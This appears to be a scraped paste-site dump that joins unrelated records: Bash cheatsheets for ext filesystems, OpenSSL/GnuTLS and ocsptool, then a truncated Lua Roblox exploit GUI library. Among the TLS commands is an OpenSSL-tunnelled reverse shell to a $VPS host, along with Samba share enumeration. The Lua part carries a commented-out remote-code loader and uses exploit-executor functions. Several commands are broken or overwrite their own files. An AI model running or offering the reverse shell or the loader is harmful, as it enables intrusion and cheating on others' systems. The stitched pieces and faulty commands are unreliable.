##   [+] 
##-========================================================================-##
tune2fs -O ^has_journal /dev/sde1


##-========================================================================-##
##   [+] Create a journal for an ext2 filesystem is as follows:
##-========================================================================-##
tune2fs -j /dev/sda1


tune2fs -c 0 /dev/sda1
##-========================================================================-##
##   [+] et the number of mounts between checks to 0
##-========================================================================-##



##-========================================================================-##
##   [+] Create a journal of size 512MB:
##-========================================================================-##
tune2fs -j -J size=512 /dev/sda1


##-========================================================================-##
##   [+] Create a journal file on a different device 
##       (here, /dev/hdb2) with this:
##-========================================================================-##
mke2fs -O journal_dev /dev/sdb2


##-========================================================================-##
##   [+] Ise this external journal file:
##-========================================================================-##
tune2fs -j -J device=/dev/sdb2 /dev/sda1




##-========================================================================-##
##   [+] Mount a partition read-only
##-========================================================================-##
mount -t ext3 -o ro /dev/sdb1 /mnt/tmp


##-========================================================================-##
##   [+] Remount /dev/sdb1 as read/write,
##-========================================================================-##
mount -t ext3 -o remount,rw /dev/sdb1




##-====================================================================-##
##   [+] Clone a partition from physical disk /dev/sda, partition 1,  
##       to physical disk /dev/sdb, partition 1 with e2image, run
##-========================================================================-##
e2image -ra -p /dev/sda1 /dev/sdb1




##-========================================================================-##
##   [+] Count ext4 events for the entire system, for 10 seconds:
##-========================================================================-##
perf stat -e 'ext4:*' -a sleep 10


"
CW2dVPj9,Xe1phix-[OpenSSL]+[GnuTLS]-Cheatsheet-[v14.8.54.].sh,xe1phix,Bash,Wednesday 28th of June 2023 09:13:56 PM CDT,"#!/bin/sh
##-=================================================-##
##   [+] Xe1phix-[OpenSSL]-[GnuTLS]-Cheatsheet-[v*.*.*.].sh
##-=================================================-##
## ------------------------------------------------------------------------------------------- ##
##   [?] 
## ------------------------------------------------------------------------------------------- ##



#!/bin/sh

##-=============================================-##
##   [+] 
##-=============================================-##
openssl genpkey -algorithm RSA -out $Key.pem


##-===================================-##
##     [+]  Encrypt and decrypt A single file:
##-===================================-##
openssl aes‐128‐cbc ‐salt ‐in $File ‐out $File.aes 
openssl aes‐128‐cbc ‐d ‐salt ‐in $File.aes ‐out $File 


##-==================================================-##
##     [+]  
##-==================================================-##



## ----------------------------------------------------------------------------------------------- ##
##    [?]  Note: the archive file can be tar archive format as well:
## ----------------------------------------------------------------------------------------------- ##

##-====================================-##
##     [+]   Tar and Encrypt a whole directory:
##-====================================-##
## --------------------------------------------------------------------------------------------------------------- ##
tar ‐cf ‐ $Dir | openssl aes‐128‐cbc ‐salt ‐out $Dir.tar.aes   			##  Encrypt 
openssl aes‐128‐cbc ‐d ‐salt ‐in $Dir.tar.aes | tar ‐x ‐f ‐          			##  Decrypt
## --------------------------------------------------------------------------------------------------------------- ##



##-======================================-##
##     [+]   Tar zip and Encrypt a whole directory:
##-======================================-##
## ------------------------------------------------------------------------------------------------------------------- ##
tar ‐zcf ‐ $Dir | openssl aes‐128‐cbc ‐salt ‐out $Dir.tar.gz.aes  			##  Encrypt 
openssl aes‐128‐cbc ‐d ‐salt ‐in $Dir.tar.gz.aes | tar ‐xz ‐f ‐        		##  Decrypt
## -------------------------------------------------------------------------------------------------------------------- ##



##-================================-##
##    [+] Generate Checksum from file
##-================================-##

echo ""## --------------------------------------------------------------------------- ##""
openssl md5 file.tar.gz            # Generate an md5 checksum from file 
openssl sha1 file.tar.gz           # Generate an sha1 checksum from file 
openssl rmd160 file.tar.gz         # Generate a RIPEMD‐160 checksum from file 
echo ""## --------------------------------------------------------------------------- ##""


gpg --symmetric --cipher $cipher --armor $sourcefile



##-=============================================-##
##    [+] Create a certificate authority
echo ""## =========================================== ##""
echo ""## ============================================================================================================= ##""
openssl req ‐new ‐x509 ‐days 730 ‐config /etc/ssl/openssl.cnf ‐keyout CA/private/cakey.pem ‐out CA/cacert.pem
echo ""## ============================================================================================================= ##""
openssl req ‐new ‐keyout $Key.pem ‐out $Req.pem ‐config /etc/ssl/openssl.cnf 
openssl req ‐nodes ‐new ‐keyout $Key.pem ‐out $Req.pem ‐config /etc/ssl/openssl.cnf       # No encryption for the key 
echo ""## ============================================================================================================= ##""

##-=============================================-##
##    [+] Sign the certificate
echo ""## =========================================== ##""

echo ""## ------------------------------------------- ##""
cat $Req.pem $Key.pem > $Key.pem 
echo ""## ============================================================================================================= ##""
openssl ca ‐policy policy_anything ‐out $Cert.pem ‐config /etc/ssl/openssl.cnf ‐infiles new.pem 
echo ""## ============================================================================================================= ##""
mv $Key.pem $Key.pem 
echo ""## ------------------------------------------- ##""



CA/private/cakey.pem (CA server private key)
CA/cacert.pem (CA server public key)
certs/servernamekey.pem (server private key)
certs/servernamecert.pem (server signed certificate)
certs/servername.pem (server certificate with private key)



openssl x509 ‐text ‐in servernamecert.pem      # View the certificate info 
openssl req ‐noout ‐text ‐in server.csr        # View the request info 
openssl s_client ‐connect cb.vu:443            # Check a web server certificate 








##-=============================-##
##    [+] create an RSA private key:
##-=============================-##
certtool --generate-privkey --outfile $Key.pem --rsa


## ---------------------------------------------------------------------- ##
##    [?]  The private key is stored in a smart card 
## ---------------------------------------------------------------------- ##
##-=================================-##
##    [+] Generate A Certificate Request:
##-=================================-##
certtool --generate-request --load-privkey ""pkcs11:..."" --load-pubkey ""pkcs11:...""


##-===============================-##
##    [+] Create self-signed certificate
##-===============================-##
certtool --generate-privkey --outfile $Key.pem
certtool --generate-self-signed --load-privkey $Key.pem --outfile $Key.pem

certtool --generate-certificate --load-request $Request.pem --outfile $Cert.pem --load-ca-certificate $CACert.pem --load-ca-privkey $CAKey.pem


##-===========================================-##
##    [+] Generate a certificate using the private key
##-===========================================-##
certtool --generate-certificate --load-privkey $Key.pem --outfile $Cert.pem --load-ca-certificate $CACert.pem --load-ca-privkey $CAKey.pem


##-==============================-##
##    [+] View Certificate information
##-==============================-##
certtool --certificate-info --infile $Cert.pem

##-=======================================-##
##    [+] Generate a PKCS #12 structure 
##    [+] using the previous key and certificate
##-=======================================-##
certtool --load-certificate $Cert.pem --load-privkey $Key.pem --to-p12 --outder --outfile $Key.p12

certtool --load-ca-certificate $CACert.pem --load-certificate $Cert.pem --load-privkey $Key.pem --to-p12 --outder --outfile $Key.p12

##-===============================================-##
##    [+] Generate Diffie-Hellman key exchange parameters:
##-===============================================-##
certtool --generate-dh-params --outfile $DH.pem --sec-param medium

certtool --generate-privkey > $Key.pem
certtool --generate-proxy --load-ca-privkey $Key.pem --load-privkey $ProxyKey.pem --load-certificate $Cert.pem --outfile $ProxyCert.pem

##-================================================-##
##    [+] Certificate revocation list generation
##    [+] Create an empty Certificate Revocation List (CRL):
##-================================================-##
certtool --generate-crl --load-ca-privkey $x509CAKey.pem --load-ca-certificate $x509CA.pem

##-=============================================================-##
##    [+] create a CRL that contains some revoked certificates, 
##    [+] place the certificates in a file and use --load-certificate as follows:
##-=============================================================-##
certtool --generate-crl --load-ca-privkey $x509CAKey.pem --load-ca-certificate $x509CA.pem --load-certificate $RevokedCerts.pem


##-=============================================-##
##    [+] verify a Certificate Revocation List (CRL):""
##-=============================================-##
certtool --verify-crl --load-ca-certificate $x509CACert.pem < $CRL.pem














cd /etc/ssl/certs
/usr/share/ssl/misc/CA -newca


##-=============================================-##
##    [+] create a SSL .cnf file for your new CA.
##-=============================================-##
cp /usr/share/ssl/openssl.cnf /etc/ssl/openssl.cnf


##-=============================================-##
##    [+] Creating a Certificate Request
##-=============================================-##
openssl req -config /etc/ssl/openssl.cnf -new -keyout $Key.pem -out $CSR.csr


##-=============================================-##
##    [+] Signing Your Certificate Request
##-=============================================-##
openssl ca -config /etc/ssl/certs/puppyCA/openssl.cnf -policy policy_anything -out $Cert.pem -infiles $CSR.csr





cd /etc/ssl
chmod 0755 certs
cd certs
chmod -R 0400 *



##-=============================================-##
##    [+] Creating a CRL
##-=============================================-##
cd /etc/ssl/certs/puppyCA/
openssl ca -gencrl -out $CRL.pem -config /etc/ssl/certs/puppyCA/openssl.cnf



##-=============================================-##
##    [+] Revoking a Certificate
##-=============================================-##
openssl ca -revoke $Cert.pem -config /etc/ssl/openssl.cnf



--verbose
--debug=						## in the range  0 through 9999
--resume
--crlf
--sni-hostname=						## Server's hostname for server name indication extension
--verify-hostname=
--starttls
--starttls-proto=https
--starttls-proto=ftp
--starttls-proto=smtp
--starttls-proto=imap
--starttls-proto=ldap
--starttls-proto=xmpp
--starttls-proto=pop3
--starttls-proto=sieve
--starttls-proto=nntp
--starttls-proto=postgres
--starttls-proto=lmtp


--local-dns
--dane								## Enable DANE certificate verification (DNSSEC)
--tofu								## Enable trust on first use authentication.
--strict-tofu						## Fail to connect if a certificate is unknown or a known certificate has changed

--ca-verification
--print-cert
--save-cert=$PEM


--ocsp								## Enable OCSP certificate verification.
--no-ocsp							## dISABLE OCSP certificate verification
--save-ocsp=

--save-server-trace=
--save-client-trace=


--rehandshake			## 


##-=============================================-##
##   [+] 
##-=============================================-##
gnutls-cli --crlf --starttls --x509cafile /etc/pki/CA/$CACert.pem --port 25 mail.$Domain


##-=============================================-##
##   [+] 
##-=============================================-##
gnutls-cli --port 9998 --x509cafile $x509CAFile.cer $Domain



openssl s_client -connect imap.gmail.com:993
 
gnutls-cli imap.gmail.com -p 993
 
socat openssl:imap.gmail.com:993 stdio
 
socat ssl:imap.gmail.com:993 readline
 
ncat --ssl imap.gmail.com 993
 
telnet-ssl -z ssl imap.gmail.com 993


##-=============================================-##
##   [+] 
##-=============================================-##
gnutls-cli -p 5223 talk.google.com


##-=============================================-##
##   [+] 
##-=============================================-##
gnutls-cli $Domain -p 389 --starttls-proto=ldap


openssl s_server -accept 8443 -cert $Cert.pem -key $Key.pem -cipher eNULL


openssl s_client -connect $IP:40004 </dev/null 2>/dev/null | openssl x509 -outform PEM > $Cert.pem
 




openssl s_server -accept 8888 -cert server.cert -key server.key -pass file:passphrase.txt -CAfile ca.cert
openssl s_client -connect 127.0.0.1:8888 -cert client.cert -key client.key -pass file:passphrase.txt -CAfile ca.cert
openssl s_client -connect 127.0.0.1:8888 -cert client.cert -key client.key -pass file:passphrase.txt -CAfile ca.cert





##-=============================================-##
##   [+] 
##-=============================================-##
openssl s_server -cert $Cert -verify 2


##-==============    ===============================-##
##   [+] 
##-=============================================-##
openssl s_client -starttls imap -connect 127.0.0.1:1143 -showcerts
openssl s_client -starttls imap -connect $Domain:1143 -showcerts


##-=============================================-##
##   [+] 
##-=============================================-##
gnutls-cli LDAP -p 389 --starttls-proto=ldap



openssl req -x509 -newkey rsa:4096 -keyout $Key.pem -out $Cert.pem -days 365 -nodes

openssl s_server -quiet -key $Key.pem -cert $Cert.pem -port 80

mkfifo /tmp/s; /bin/bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $VPS:1024 > /tmp/s; rm /tmp/s





##-=============================================-##
##   [+] 
##-=============================================-##
openssl s_server -msg -tlsextdebug -state -cert $Cert.crt -key $Key.key





##-=============================================-##
##   [+] 
##-=============================================-##
openssl s_server -accept 1111 -cert $Cert.crt -key $Key.key -CAfile $CA.crt -verify 1



##-=============================================-##
##    [+] Get the SAN (subjectAltName) of a sites certificate.
##-=============================================-##
echo ""quit"" | openssl s_client -tls1_2 -connect $Domain:443 | openssl x509 -noout -text | grep ""DNS:"" | perl -pe ""s/(, )?DNS:/\n/g""


##-=============================================-##
##    [+] List SAN domains for a certificate 
##-=============================================-##
echo | openssl s_client -tls1_2 -connect $Domain:443 2>&1 | openssl x509 -noout -text | awk -F, -v OFS=""\n"" '/DNS:/{x=gsub(/ *DNS:/, """"); $1=$1; print $0}'


##-=============================================-##
##   [+] Debug openssl from CLI 
##-=============================================-##
openssl s_client -tls1_2 -state -connect $Domain:443


##-=============================================-##
##   [+] Download certificate from FTP 
##-=============================================-##
echo | openssl s_client -servername ftp.$Domain -connect ftp.$Domain:21 -starttls ftp 2>/dev/null | sed -ne '/-BEGIN CERTIFICATE-/,/-END CERTIFICATE-/p'


##-=============================================-##
##   [+] Download certificate chain from FTP 
##-=============================================-##
echo | openssl s_client -showcerts -connect ftp.$Domain:21 -starttls ftp 2>/dev/null | sed -ne '/-BEGIN CERTIFICATE-/,/-END CERTIFICATE-/p'


echo | openssl s_client -connect $Domain:21 -starttls ftp
echo | openssl s_client -connect ftp.$Domain:21 -starttls ftp

echo | openssl s_client -connect ftp.debian.org:21 -starttls ftp


##-=============================================-##
##   [+] test and send email via smtps using openssl client 
##-=============================================-##
(sleep 1;echo EHLO MAIL;sleep 1;echo ""MAIL FROM: <a@foo.de>"";sleep 1;echo ""RCPT TO: <b@bar.eu>"";sleep 1;echo DATA;sleep 1;echo Subject: test;sleep 1;echo;sleep 1;echo Message;sleep 1;echo .;sleep 1;)|openssl s_client -host b.de -port 25 -starttls smtp


##-=============================================-##
##   [+] Get SSL expiration date from remote site 
##-=============================================-##
openssl s_client -showcerts -servername www.google.com -connect www.google.com:443 </dev/null | sed -ne '/-BEGIN CERTIFICATE-/,/-END CERTIFICATE-/p' | openssl x509 -noout -subject -dates
echo | openssl s_client -servername google.de -connect google.de:443 2>/dev/null | openssl x509 -noout -enddate





openssl s_client -tls1_2 -host registry.videoanalytics.x5.ru -port 443


openssl s_client -tls1_2 -connect graph.facebook.com:443
openssl s_client -connect graph.facebook.com:443 -debug -state -msg -CAfile /etc/ssl/certs/$CACertificates.crt


##-==========================-##
##   [+] Connect Using TLSv1.2
##-==========================-##
openssl s_client -tls1_2 -connect $Domain:443





Get a list of all browsable Samba shares on the target server.

smbclient -N -gL \\SambaServer 2>&1 | grep -e ""Disk|"" | cut -d'|' -f2



##-=====================================-##
##     [+] Connect Using A SSLv3 Connection 
##-=====================================-##
openssl s_client -connect $Domain:443 -ssl3
openssl s_client -connect localhost:443 -ssl3


openssl s_client -showcerts -connect 127.0.0.1:8080


openssl s_client -tls1_2 -alpn h2 -connect 127.0.0.1:443 -status    
echo | openssl s_client -alpn h2 -connect localhost:443 | grep ALPN 



openssl s_client -debug -connect $Domain:9080

openssl s_client -tls1_2 -showcerts -connect $Domain:443


##-=============================================-##
##   [+] Connect 
##-=============================================-##
openssl s_client -debug -state -connect localhost:3001


##-=============================================-##
##   [+] Connect 
##-=============================================-##
openssl s_client -connect $LDAPService:636
openssl s_client -connect $LDAPHost:636
openssl s_client -connect $LDAPHost:636 -ssl3
openssl s_client -connect $LDAPHost:636 -stls1

##-=============================================-##
##   [+] Connect 
##-=============================================-##
openssl s_client -tls1_2 -connect auth.startssl.com:443   


##-=============================================-##
##   [+] Connect To POP3 Using OpenSSL
##-=============================================-##
openssl s_client -crlf -connect $Domain:110 -starttls pop3


##-=============================================-##
##   [+] Connect to SMTP server using STARTTLS
##-=============================================-##
openssl s_client -starttls smtp -crlf -connect 127.0.0.1:25

openssl s_client -tls1_2 -connect auth.startssl.com:443    

openssl s_client -connect $Domain:443 -tls1_2 -servername $Domain | openssl x509 -text -noout


##   Connect to SMTP server using STARTTLS 

##   [+] connect to an SMTP server over TLS.
##   [?] which is useful for debugging SMTP sessions.

## ---------------------------------------- ##
##    [?] Command Source:
## ---------------------------------------- ##
## ------------------------------------------------------------------------------------------------------------------------------------------------- ##
##~->  https://www.commandlinefu.com/commands/view/3093/connect-to-smtp-server-using-starttls
## ------------------------------------------------------------------------------------------------------------------------------------------------- ##
openssl s_client -starttls smtp -crlf -connect 127.0.0.1:25



openssl s_client -connect $Domain:443 -state -nbio -servername $Domain
openssl s_client -tls1_2 -connect $Domain:443 -state -nbio -servername $Domain

openssl s_client -connect smtp.comcast.net:465 -tls1_2

##-================================-##
##     [+] Save the output In a File
##     [+] display the certificate details
##-================================-##
openssl s_client -connect smtp.comcast.net:465 -tls1_2 > /tmp/smtps
openssl x509 -in /tmp/smtps -text



openssl x509 -in serverCASigned.crt -text -noout


openssl s_client -connect smtp.comcast.net:465 -tls1_2 | openssl x509 -in /dev/stdin -text


openssl s_client -connect smtp.office365.com:587 -starttls smtp


##-================================-##
##     [+] Connect to Gmail using IMAP
##-================================-##
openssl s_client -tls1 -connect imap.gmail.com:993
openssl s_client -tls1_2 -connect imap.gmail.com:993
openssl s_client -ssl3 -connect imap.gmail.com:993

openssl s_client -host $Domain -port 993
openssl s_client -tls1 -host $Domain -port 993
openssl s_client -tls1_2 -host $Domain -port $Port



##-==================================-##
##     [+] Connect to an MTA Using SMTP
##-==================================-##
openssl s_client -connect $Sub.$Domain.com:25 -starttls smtp
openssl s_client -connect $Domain:25 -starttls smtp

gnutls-cli-debug --starttls-proto smtp --port 25 localhost

##-=======================================-##
##     [+] Connect To A SMTP Server 
##     [+] Securing The Connection Using A CA:
##-=======================================-##
openssl s_client -starttls smtp -CApath $Dir/ -connect 127.0.0.1:25
openssl s_client -starttls smtp -CApath $Dir/ -connect $Domain:25
openssl s_client -CAfile $CAFile -starttls smtp -connect 127.0.0.1:25
openssl s_client -CAfile $CAFile -starttls smtp -connect $Domain:25
openssl s_client -CAfile $CAFile -starttls smtp -connect $Domain --port 25
openssl s_client -starttls smtp -CApath /etc/postfix/certs/ -connect 127.0.0.1:25
openssl s_client -starttls smtp -CApath /etc/postfix/certs/ -connect $Domain:25



openssl s_client -connect smtp.office365.com:587 -starttls smtp






##-=============================================-##
##     [+] Connect to a non-MTA client such as an IMAP server:
##-=============================================-##
openssl s_client -connect $Sub.$Domain.com:993
openssl s_client -connect $Domain:993



openssl s_client -showcerts -connect chat.freenode.net:6697
openssl s_client -showcerts -connect -tls1_2 chat.freenode.net:6697




##-=============================================-##
##     [+] Starting a Test SSL Server Using the openssl s_server Function
##-=============================================-##
openssl s_server -key puppy.yourdomain.com.key.pem -cert puppy.yourdomain.com.cert.pem



telnet mail.$Domain 25

openssl s_client -starttls smtp -CApath /etc/postfix/certs/ -connect 127.0.0.1:25
openssl s_client -starttls smtp -CApath /etc/postfix/certs/ -connect 127.0.0.1:25
openssl s_client -starttls smtp -CApath /etc/postfix/certs/ -connect 127.0.0.1:25

openssl s_client -starttls smtp -CApath /etc/postfix/certs/ -connect 127.0.0.1:25

openssl s_client -connect smtp.office365.com:587 -starttls smtp





openssl s_client -tls1_2 -CApath /etc/ssl/certs -connect $Domain:443



openssl s_client -tls1_2 -host google.com -port 443 | openssl x509 -noout -dates -subject -issuer 






ehlo localhost


##-=============================================-##
##     [+] Setting Up an SSL Certificate for Apache2
##-=============================================-##

openssl -x509 -text -in server.crt

openssl verify -CAfile /path/to/trusted_ca.crt -purpose sslserver my.domain.org.crt


openssl x509 -noout -modulus -in my.domain.org.pem | openssl sha1
openssl rsa -noout -modulus -in my.domain.org.key | openssl sha1



cp my.domain.org.key my.domain.org.crt /etc/apache2/ssl
chown root:root my.domain.org.key; chmod og-r my.domain.org.key
chown root:root my.domain.org.crt; chmod a+r my.domain.org.crt






mkdir -p /etc/ssl/private/
openssl req -x509 -nodes -newkey rsa:4096 -keyout /etc/ssl/private/pure-ftpd.pem -out /etc/ssl/private/pure-ftpd.pem
chmod -f 0600 /etc/ssl/private/*.pem


--verbose

--x509crlfile=
--x509cafile=
--x509keyfile= 
--x509certfile=


--sni-hostname=
--verify-hostname=

--starttls
--starttls-proto=
https, ftp, smtp, imap, ldap, xmpp, lmtp, pop3, nntp, sieve, postgres


--port=


--save-server-trace=str
--save-client-trace=
--logfile=



--print-cert





gnutls-cli-debug localhost


gnutls-cli-debug --starttls-proto smtp --port 25 localhost







curl https://vmlinux:2376/images/json --cert ~/.docker/cert.pem --key ~/.docker/key.pem --cacert ~/.docker/ca.pem
"
vwiR96B1,Xe1phix-[OCSPTool]-Cheatsheet-[v4.8.5].sh,xe1phix,Bash,Wednesday 28th of June 2023 09:11:55 PM CDT,"#!/bin/sh
##-===================================================-##
##   [+] Xe1phix-[OCSPTool]-Cheatsheet-[v4.8.5].sh
##-===================================================-##
## 
## 
##-===============================================================================-##
##   [+] generate an OCSP request for a certificate and to verify the response
##-===============================================================================-##



##-=======================================================================-##
##   [+] Use gnutls-cli to get a copy of the server certificate chain:
##-=======================================================================-##
echo | gnutls-cli -p 443 $Domain --save-cert $Chain.pem



##-=============================-##
##   [+] Verify The Response
##-=============================-##
certtool -i < $Chain.pem


##-=======================================================-##
##   [+] Request Information on the Chain Certificates.
##-=======================================================-##
ocsptool --ask --load-chain $Chain.pem


##-=======================================================-##
##   [+] Ask information on a particular certificate 
##-=======================================================-##
## ------------------------------------------------------- ##
##   [?] using --load-cert and --load-issuer
## ------------------------------------------------------- ##
ocsptool --ask http://ocsp.CAcert.org/ --load-chain $Chain.pem



##-======================================================-##
##   [+] Parse  an OCSP request and print information:
##-======================================================-##
## -------------------------------------------------------------------- ##
##   [?] specify the name of the file containing the OCSP request
## -------------------------------------------------------------------- ##
##   [?] It should contain the OCSP request in binary DER format.
## -------------------------------------------------------------------- ##
ocsptool -i -Q $OCSPRequest.der


## ---------------------------------------------------------------------- ##
##   [?] The input file may also be sent to standard input like this:
## ---------------------------------------------------------------------- ##
cat $OCSPRequest.der | ocsptool --request-info



##-==================================================-##
##   [+] Print information about an OCSP response:
##-==================================================-##

##-================================-##
##   [+] Parse an OCSP Response 
##-================================-##
ocsptool -j -Q $OCSPRequest.der
cat $OCSPRequest.der | ocsptool --response-info





##-==================================-##
##   [+] Generate an OCSP request
##-==================================-##
ocsptool -q --load-issuer $Issuer.pem --load-cert $Client.pem --outfile $OCSPRequest.der


##-===========================================-##
##   [+] Verify signature in OCSP response
##-===========================================-##
## 
## ------------------------------------------------------------------------- ##
##   [?] The OCSP response is verified against a set of trust anchors
## ------------------------------------------------------------------------- ##
## 
## ------------------------------------------------------------------------- ##
##   [?] The trust anchors are concatenated certificates in PEM format.
## ------------------------------------------------------------------------- ##
## 
## ------------------------------------------------------------------------- ##
##   [?] The certificate that signed the OCSP response 
##       needs to be in the set of trust anchors
## ------------------------------------------------------------------------- ##
## 
## 
##                          or 
## 
## ----------------------------------------------------- ##
##   [?] The issuer of the signer certificate 
##       needs to be in the set of trust anchors 
##       and the OCSP Extended Key Usage bit has to
##       be asserted in the signer certificate.
## ----------------------------------------------------- ##
ocsptool -e --load-trust $Issuer.pem --load-response $OCSPResponse.der




##-=====================================================================-##
##   [+] Verify signature in OCSP response against given certificate
##-=====================================================================-##
ocsptool -e --load-signer $OCSPSigner.pem --load-response $OCSPResponse.der




##-================================-##
##   [+] Certificate information
##-================================-##
certtool --certificate-info --infile $Cert.pem



##-========================================-##
##   [+] PKCS #12 structure generation
##-========================================-##
certtool --load-certificate $Cert.pem --load-privkey $Key.pem --to-p12 --outder --outfile $Key.p12

certtool --load-ca-certificate $CA.pem --load-certificate $Cert.pem --load-privkey $Key.pem --to-p12 --outder --outfile $Key.p12


##-================================-##
##   [+] Verifying a certificate
##-================================-##
certtool --verify --infile $Cert.pem

certtool --verify --verify-hostname $HostName --infile $Cert.pem





certtool --pubkey-info --infile $Key.pem
certtool --certificate-info $Cert.pem
certtool --fingerprint $Key.pem



certtool --generate-self-signed



"
f0fAqVuQ,project-hidden-gui,DistinguishedPro,Lua,Wednesday 28th of June 2023 08:38:53 PM CDT,"-- // Lib \\ --
--[[
    local UI = loadstring(game:HttpGet(""https://abyss.best/assets/files/gayasf.ui2?key=5y1lxXSfWKhlQkSqhUuFyB8kPp8hsCau""))()
]]
-- // Library Init \\ --
local Start = tick()
local LoadTime = tick()
local Secure = setmetatable({}, {
    __index = function(Idx, Val)
        return game:GetService(Val)
    end
})
--
local UserInput = Secure.UserInputService
local RunService = Secure.RunService
local CoreGui = Secure.CoreGui
local Players = Secure.Players
local LocalPlayer = Players.LocalPlayer
local Camera = Workspace.CurrentCamera
local HttpService = Secure.HttpService
local Mouse = LocalPlayer:GetMouse()
local InputGUI = Instance.new(""ScreenGui"", CoreGui)
-- local Stats = Secure.Stats.Network.ServerStatsItem[""Data Ping""] 
--
-- Aimware = {6, [[{""Outline"":""000005"",""Accent"":""c82828"",""LightText"":""e8e8e8"",""DarkText"":""afafaf"",""LightContrast"":""2b2b2b"",""CursorOutline"":""191919"",""DarkContrast"":""191919"",""TextBorder"":""0a0a0a"",""Inline"":""373737""}]]},
--
local Library = {
    Theme = {
        Accent = {
            Color3.fromHex(""#7885f5""), -- Color3.fromHex(""#a280d9""), -- Color3.fromRGB(255, 42, 10), Color3.fromHex(""#3599d4"")
            Color3.fromRGB(180, 156, 255),
            Color3.fromRGB(114, 0, 198),
            Color3.fromRGB(139, 130, 185),
            Color3.fromHex(""#a83299"")
        },
        Notification = {
            Error = Color3.fromHex(""#c82828""),
            Warning = Color3.fromHex(""#fc9803"")
        },
        Hitbox = Color3.fromRGB(69, 69, 69),
        Friend = Color3.fromRGB(0, 200, 0),
        Outline = Color3.fromHex(""#000005""),
        Inline = Color3.fromHex(""#323232""),
        LightContrast = Color3.fromHex(""#202020""),
        DarkContrast = Color3.fromHex(""#191919""),
        Text = Color3.fromHex(""#e8e8e8""),
        TextInactive = Color3.fromHex(""#aaaaaa""),
        Font = Drawing.Fonts.Plex,
        TextSize = 13,
        UseOutline = false
    },
    Icons = {},
    Flags = {},
    Items = {},
    Drawings = {},
    Ignores = {},
    Keybind = {},
    Watermark = {},
    Connections = {},
    Keys = {
        KeyBoard = {[""Q""] = ""Q"", [""W""] = ""W"", [""E""] = ""E"", [""R""] = ""R"", [""T""] = ""T"", [""Y""] = ""Y"", [""U""] = ""U"", [""I""] = ""I"", [""O""] = ""O"", [""P""] = ""P"", [""A""] = ""A"", [""S""] = ""S"", [""D""] = ""D"", [""F""] = ""F"", [""G""] = ""G"", [""H""] = ""H"", [""J""] = ""J"", [""K""] = ""K"", [""L""] = ""L"", [""Z""] = ""Z"", [""X""] = ""X"", [""C""] = ""C"", [""V""] = ""V"", [""B""] = ""B"", [""N""] = ""N"", [""M""] = ""M"", [""One""] = {""1"", ""!""}, [""Two""] = {""2"", ""\""""}, [""Three""] = {""3"", ""£""}, [""Four""] = {""4"", ""$""}, [""Five""] = {""5"", ""%""}, [""Six""] = {""6"", ""^""}, [""Seven""] = {""7"", ""&""}, [""Eight""] = {""8"", ""*""}, [""Nine""] = {""9"", ""(""}, [""Zero""] = {""0"", "")""}, [""Space""] = "" "", [""Slash""] = {""/"", ""?""}, [""BackSlash""] = {""\\"", ""|""}, [""Minus""] = {""-"", ""_""}, [""Equals""] = {""="", ""+""}, [""RightBracket""] = {""]"", ""}""}, [""LeftBracket""] = {""["", ""{""}, [""Semicolon""] = {"";"", "":""}, [""Quote""] = {""'"", ""@""}, [""Comma""] = {"","", ""<""}, [""Period""] = {""."", "">""}},
        Letters = {""Q"", ""W"", ""E"", ""R"", ""T"", ""Y"", ""U"", ""I"", ""O"", ""P"", ""A"", ""S"", ""D"", ""F"", ""G"", ""H"", ""J"", ""K"", ""L"", ""Z"", ""X"", ""C"", ""V"", ""B"", ""N"", ""M""},
        KeyCodes = {""Q"", ""W"", ""E"", ""R"", ""T"", ""Y"", ""U"", ""I"", ""O"", ""P"", ""A"", ""S"", ""D"", ""F"", ""G"", ""H"", ""J"", ""K"", ""L"", ""Z"", ""X"", ""C"", ""V"", ""B"", ""N"", ""M"", ""One"", ""Two"", ""Three"", ""Four"", ""Five"", ""Six"", ""Seveen"", ""Eight"", ""Nine"", ""Zero"", ""Insert"", ""Tab"", ""Home"", ""End"", ""LeftAlt"", ""LeftControl"", ""LeftShift"", ""RightAlt"", ""RightControl"", ""RightShift"", ""CapsLock""},
        Inputs = {""MouseButton1"", ""MouseButton2"", ""MouseButton3""},
        Shortened = {[""MouseButton1""] = ""M1"", [""MouseButton2""] = ""M2"", [""MouseButton3""] = ""M3"", [""Insert""] = ""INS"", [""LeftAlt""] = ""LA"", [""LeftControl""] = ""LC"", [""LeftShift""] = ""LS"", [""RightAlt""] = ""RA"", [""RightControl""] = ""RC"", [""RightShift""] = ""RS"", [""CapsLock""] = ""CL""}
    },
    Input = {
        Caplock = false,
        LeftShift = false
    },
    Images = {},
    WindowVisible = true,
    Communication = Instance.new(""BindableEvent"")
}
--
local Utility = {}
--
getgenv().Library = Library
getgenv().Utility = Utility
--syn.protect_gui(InputGUI)
-----------------------------------------------------------------
do
    Utility.AddInstance = function(NewInstance, Properties)
        local NewInstance = Instance.new(NewInstance)
        --
        for Index, Value in pairs(Properties) do
            NewInstance[Index] = Value
        end
        --
        return NewInstance
    end
    --
    Utility.CLCheck = function()
        repeat task.wait() until iswindowactive()
        do
            local InputHandle = Utility.AddInstance(""TextBox"", {
                Position = UDim2.new(0, 0, 0, 0)
            })
            --
            InputHandle:CaptureFocus() task.wait() keypress(0x4E) task.wait() keyrelease(0x4E) InputHandle:ReleaseFocus()
            Library.Input.Caplock = InputHandle.Text == ""N"" and true or false
            InputHandle:Destroy()
        end
    end
    --
    Utility.Loop = function(Delay, Call)
        local Callback = typeof(Call) == ""function"" and Call or function() end
        --
        task.spawn(function()
            while task.wait(Delay) do
                local Success, Error = pcall(function()
                    Callback()
                end)
                --
                if Error then 
                    return 
                end
            end
        end)
    end
    --
    Utility.RemoveDrawing = function(Instance, Location)
        local SpecificDrawing = 0
        --
        Location = Location or Library.Drawings
        --
        for Index, Value in pairs(Location) do 
            if Value[1] == Instance then
                if Value[1] then
                    Value[1]:Remove()
                end
                if Value[2] then
                    Value[2] = nil
                end
                SpecificDrawing = Index
            end
        end
        --
        table.remove(Location, table.find(Location, Location[SpecificDrawing]))
    end
    --
    Utility.AddConnection = function(Type, Callback)
        local Connection = Type:Connect(Callback)
        --
        Library.Connections[#Library.Connections + 1] = Connection
        --
        return Connection
    end
    --
    Utility.Round = function(Num, Float)
        local Bracket = 1 / Float;
        return math.floor(Num * Bracket) / Bracket;
    end
    --
    Utility.AddDrawing = function(Instance, Properties, Location)
        local InstanceType = Instance
        local Instance = Drawing.new(Instance)
        --
        for Index, Value in pairs(Properties) do
            Instance[Index] = Value
            if InstanceType == ""Text"" then
                if Index == ""Font"" then
                    Instance.Font = Library.Theme.Font
                end
                if Index == ""Size"" then
